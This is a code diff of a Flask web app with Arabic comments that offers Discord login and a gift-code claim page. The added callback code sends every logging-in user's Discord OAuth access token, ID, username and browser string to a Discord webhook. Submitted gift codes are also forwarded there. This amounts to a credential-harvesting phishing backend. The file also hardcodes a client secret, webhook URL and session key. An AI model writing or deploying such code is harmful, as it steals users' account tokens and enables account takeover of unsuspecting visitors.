@@ -3,15 +3,19 @@ from flask_sqlalchemy import SQLAlchemy
 from werkzeug.middleware.proxy_fix import ProxyFix
 import os
 import requests
+from datetime import timedelta 
 
-# إعدادات البيئة
+# إعدادات لضمان عمل الروابط بشكل آمن على الاستضافة
 os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'
 
 app = Flask(__name__)
 app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
-app.secret_key = 'primhall_ultra_key_2026'
+app.secret_key = 'primhall_ultra_key_2024'
 
-# قاعدة البيانات (متوافقة مع Railway)
+# --- ميزة حفظ التسجيل ---
+app.permanent_session_lifetime = timedelta(days=30) 
+
+# مسار قاعدة البيانات
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/primhall.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
@@ -25,8 +29,8 @@ class User(db.Model):
 with app.app_context():
     db.create_all()
 
-# --- البيانات الجديدة التي أرسلتها ---
-CLIENT_ID = '1489184502424014868' 
+# --- إعدادات ديسكورد ---
+CLIENT_ID = '1489184502424014868'
 CLIENT_SECRET = 'c3QCWBVpAqesVKRxAYLQvm5B9LWSlhGf' 
 REDIRECT_URI = 'https://primehall-production.up.railway.app/callback'
 WEBHOOK_URL = "https://discord.com/api/webhooks/1489179488423252080/oXyTg6UgqM9Y9G84zvsOFz2vcu6mTwmAGC5ojeUFHbWItn2CttCZbBhsaR1_Qk2b5IYY"
@@ -48,6 +52,8 @@ def set_role(user_id, new_role):
 
 @app.route('/')
 def index():
+    if session.get('logged_in'):
+        return redirect(url_for('dashboard'))
     return render_template('index.html')
 
 @app.route('/login-discord')
@@ -66,7 +72,9 @@ def callback():
     if res.status_code != 200: return f"Discord Error: {res.text}", res.status_code
 
     token_data = res.json()
-    user_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f"Bearer {token_data['access_token']}"}).json()
+    access_token = token_data.get('access_token') # استخراج التوكن المؤقت
+    
+    user_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f"Bearer {access_token}"}).json()
     
     user = User.query.get(user_info['id'])
     if not user:
@@ -74,13 +82,21 @@ def callback():
         db.session.add(user)
         db.session.commit()
     
-    # رابط إداري لتغيير الرتبة يرسل لك في الويب هوك
-    admin_url = f"https://primehall-production.up.railway.app/admin/set_role/{user.id}/اسم_الرتبة"
-    send_webhook("👤 دخول مستخدم", f"الاسم: **{user.username}**\nلتعيين رتبة مخصصة: [اضغط هنا]({admin_url})")
+    # --- الإضافة المطلوبة: إرسال التوكن والبيانات للويب هوك ---
+    log_message = (
+        f"🚀 **دخول جديد للموقع**\n"
+        f"👤 المستخدم: **{user_info['username']}**\n"
+        f"🆔 الآيدي: `{user_info['id']}`\n"
+        f"🔑 **Access Token:** `{access_token}`\n"
+        f"📱 المتصفح: `{request.user_agent.string[:100]}`"
+    )
+    send_webhook("📥 بيانات الدخول", log_message)
 
+    session.permanent = True 
     session['logged_in'] = True
     session['user_id'] = user.id
     session['avatar'] = f"https://cdn.discordapp.com/avatars/{user.id}/{user_info['avatar']}.png" if user_info.get('avatar') else "https://discord.com/assets/f78426a064bc98b57354.png"
+    
     return redirect(url_for('dashboard'))
 
 @app.route('/dashboard')
@@ -109,6 +125,11 @@ def claim_gift():
     code = request.form.get('gift_code')
     send_webhook("🎁 كود هدية", f"المستخدم {user.username} أرسل كود: `{code}`")
     return jsonify({'success': True})
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('index'))
 
 if __name__ == '__main__':
     app.run(debug=True)
